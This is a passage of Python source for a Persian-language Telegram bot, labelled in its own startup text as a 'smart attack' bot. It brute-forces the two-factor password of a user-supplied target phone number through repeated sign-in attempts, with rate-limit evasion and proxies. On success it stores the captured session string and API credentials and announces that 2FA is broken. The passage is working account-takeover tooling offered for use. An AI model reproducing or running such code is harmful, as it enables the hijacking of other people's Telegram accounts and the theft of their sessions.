            if attempt % 5 == 0:
                await context.bot.edit_message_text(
                    f"""
🔐 <b>تست پسورد...</b>

📱 شماره: <code>{phone}</code>
🔑 پسورد فعلی: <code>{password}</code>
📊 تلاش‌ها: {attempt} از {len(passwords)}
📈 پیشرفت: {(attempt/len(passwords))*100:.1f}%

⏳ لطفاً صبر کنید...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
            
            try:
                await client.sign_in(password=password)
                
                session_string = client.session.save()
                await client.disconnect()
                
                account_name = "بدون نام"
                try:
                    client2 = TelegramClient(StringSession(session_string), 
                                            user_sessions[user_id].get('api_id'),
                                            user_sessions[user_id].get('api_hash'))
                    await client2.connect()
                    if await client2.is_user_authorized():
                        me = await client2.get_me()
                        account_name = me.first_name if me.first_name else "کاربر"
                    await client2.disconnect()
                except:
                    pass
                
                if user_id_str not in self_data:
                    self_data[user_id_str] = []
                
                self_data[user_id_str].append({
                    "session": session_string,
                    "phone": phone,
                    "api_id": user_sessions[user_id].get('api_id'),
                    "api_hash": user_sessions[user_id].get('api_hash'),
                    "account_name": account_name,
                    "active": True,
                    "clock_active": False,
                    "active_time": "تنظیم نشده",
                    "font_type": "1",
                    "created": datetime.now().strftime("%Y/%m/%d %H:%M"),
                    "last_update": datetime.now().strftime("%Y/%m/%d %H:%M")
                })
                save_data()
                
                attack_status[user_id_str][phone]['found_password'] = password
                attack_status[user_id_str][phone]['status'] = 'کامل - 2FA شکسته شد'
                save_attack_data()
                
                await context.bot.edit_message_text(
                    f"""
✅ <b>حمله موفقیت‌آمیز!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>
🔐 پسورد پیدا شده: <code>{password}</code>

📊 <b>آمار نهایی:</b>
• کل تلاش‌ها: {total_attempts:,}
• پسوردهای تست شده: {attempt}

🔴 <b>هشدار امنیتی شدید!</b>
اکانت شما کاملاً آسیب‌پذیر است!

✅ <b>توصیه‌ها:</b>
1. از کدهای تصادفی استفاده کنید
2. حتماً 2FA را فعال کنید
3. از پسورد قوی استفاده کنید
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                await clear_user_session(user_id)
                return True
                
            except FloodWaitError as e:
                await asyncio.sleep(min(e.seconds, 60) + 5)
                continue
                
            except Exception:
                continue
            
            await asyncio.sleep(random.uniform(30, 90))
        
        return False
        
    except Exception as e:
        logger.error(f"Error in smart_password_attack: {e}")
        return False

# ============ توقف همه حمله‌ها ============
async def stop_all_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    
    if user_id in attack_status:
        for phone in attack_status[user_id]:
            attack_status[user_id][phone]['status'] = 'متوقف شد توسط کاربر'
        save_attack_data()
    
    text = "✅ همه حمله‌ها متوقف شدند!"
    keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت تنظیمات تلاش ============
async def handle_attempts_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if not context.user_data.get('setting_attempts'):
        return
    
    try:
        max_attempts = int(text)
        if max_attempts < 1 or max_attempts > 10:
            await update.message.reply_text("❌ عدد باید بین 1 تا 10 باشد!", parse_mode='HTML')
            return
        
        context.user_data['max_attempts'] = max_attempts
        context.user_data['setting_attempts'] = False
        
        await update.message.reply_text(
            f"""
✅ تنظیمات ذخیره شد!

📅 تلاش روزانه: {max_attempts} بار

📱 حالا لطفاً شماره تلفن هدف را وارد کنید:
""",
            parse_mode='HTML'
        )
        
        user_sessions[user_id]['step'] = "phone"
        
    except ValueError:
        await update.message.reply_text("❌ لطفاً یک عدد معتبر وارد کنید!", parse_mode='HTML')

# ============ پاک کردن سشن ============
async def clear_user_session(user_id):
    if user_id in user_sessions:
        try:
            client = user_sessions[user_id].get('client')
            if client:
                await client.disconnect()
        except:
            pass
        del user_sessions[user_id]
    if user_id in active_tasks:
        active_tasks[user_id].cancel()
        del active_tasks[user_id]

# ============ بازگشت ============
async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    
    if str(user_id) in login_sessions:
        del login_sessions[str(user_id)]
    
    context.user_data['setting_attempts'] = False
    
    await main_menu(update, context, edit=True)

# ============ هندلر پیام‌ها ============
async def handle_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.user_data.get('setting_attempts'):
        await handle_attempts_settings(update, context)
        return
    
    if str(user_id) in login_sessions and login_sessions[str(user_id)].get('step') == 'waiting_code':
        await handle_get_account_code(update, context)
        return
    
    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")
        if step == "phone":
            await handle_phone(update, context)
        elif step == "api_id":
            await handle_api_id(update, context)
        elif step == "api_hash":
            await handle_api_hash(update, context)
        return
    
    await update.message.reply_text("❌ لطفاً از دکمه‌های منو استفاده کنید.", parse_mode='HTML')

# ============ اجرا ============
def main():
    try:
        delete_webhook()
        
        print("=" * 60)
        print("🔐 ربات حمله هوشمند تلگرام")
        print("=" * 60)
        print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
        print("=" * 60)
        
        application = Application.builder().token(TOKEN).connect_timeout(30).read_timeout(30).build()
        
        application.add_handler(CallbackQueryHandler(new_session, pattern="^new_session$"))
        application.add_handler(CallbackQueryHandler(attack_settings, pattern="^attack_settings$"))
        application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
        application.add_handler(CallbackQueryHandler(select_account, pattern="^select_account_"))
        application.add_handler(CallbackQueryHandler(show_attack_status, pattern="^attack_status$"))
        application.add_handler(CallbackQueryHandler(stop_all_attacks, pattern="^stop_all_attacks$"))
        application.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
        
        application.add_handler(CommandHandler("start", main_menu))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_messages))
        
        async def error_handler(update, context):
            if "Conflict" in str(context.error):
                logger.warning("Conflict error - ignoring")
                return
            logger.error(f"Update {update} caused error {context.error}")
        
        application.add_error_handler(error_handler)
        
        print("✅ ربات با موفقیت راه‌اندازی شد.")
        print("💡 برای شروع از /start استفاده کنید.")
        print("=" * 60)
        
        application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        print(f"❌ خطا: {e}")

if __name__ == "__main__":
    main()
